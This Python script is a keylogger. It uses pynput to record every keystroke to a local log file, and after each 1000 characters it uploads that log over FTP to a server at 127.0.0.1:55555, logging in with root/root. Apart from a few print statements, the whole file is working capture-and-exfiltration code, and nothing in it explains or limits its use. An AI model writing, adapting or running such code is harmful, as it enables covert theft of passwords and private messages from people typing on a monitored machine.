from pynput import keyboard
import logging
import ftplib
import os

log_file = "keylog.log"
print(log_file)
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s : %(message)s')

key_press_data = ""
print("Logging:")

def on_press(key):
    global key_press_data
    try: 
        key_press_data += key.char
        if(len(key_press_data) == 1000):
            logging.info('String: {0}'.format(key_press_data))
            key_press_data=""
            ftp_server = ftplib.FTP()
            ftp_host = "127.0.0.1"
            ftp_port = 55555
            ftp_server.connect(ftp_host, ftp_port)
            ftp_server.login("root", "root") 
            print(ftp_server.pwd())
            print(ftp_server.retrlines('LIST'))
            print("Preparing to transfer: %s" % log_file)
            try:
                file = open(log_file, 'br')
                ftp_server.storbinary('STOR %s' % log_file, file)
            except OSError as e:
                print(str(e))
            except Exception as e:
                print(str(e))

        #logging.info('Key {0} pressed'.format(key.char))
    except:
        print('special key {0} pressed'.format(key))


        
def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
